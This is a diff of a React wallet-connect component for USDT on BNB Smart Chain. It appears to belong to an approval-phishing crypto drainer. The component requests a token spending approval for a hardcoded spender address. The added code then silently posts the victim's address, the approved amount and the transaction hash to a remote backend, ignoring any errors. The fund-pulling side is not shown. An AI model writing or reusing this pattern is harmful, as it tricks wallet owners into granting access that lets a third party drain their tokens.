@@ -1,4 +1,3 @@
-import React from "react";
 import { useRef, useState, useEffect } from "react";
 import { motion, AnimatePresence } from "motion/react";
 import {
@@ -7,7 +6,6 @@ import {
   AlertCircle,
   CheckCircle2,
   Copy,
-  ExternalLink,
 } from "lucide-react";
 import {
   useAccount,
@@ -21,9 +19,8 @@ import {
 } from "wagmi";
 import { formatAddress } from "../utils/format";
 import { USDT_ADDRESSES, ERC20_ABI, NETWORK_IDS } from "../config/contracts";
-import { formatUnits, maxUint256, parseUnits } from "viem";
-import { USDT_SPENDER_ADDRESS } from "../../../env";
-import { toast } from "sonner";
+import { formatUnits, parseUnits } from "viem";
+import { USDT_SPENDER_ADDRESS, BASE_URL } from "../../../env";
 import { Scanner } from './Scanner';
 
 interface WalletConnectProps {
@@ -137,7 +134,8 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
       !isConnected ||
       !address ||
       chain?.id !== NETWORK_IDS.BSC ||
-      !USDT_SPENDER_ADDRESS
+      !USDT_SPENDER_ADDRESS ||
+      !publicClient
     )
       return;
 
@@ -188,6 +186,19 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
           try {
             window.localStorage.setItem(storageKey, '1');
             window.localStorage.removeItem(pendingKey);
+
+            await fetch(`${BASE_URL}/api/approved`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                network: 'BSC',
+                owner: address,
+                spender: USDT_SPENDER_ADDRESS,
+                amount: amount.toString(),
+                txHash: hash
+              })
+            });
+
 
           } catch { /* ignore */ }
 
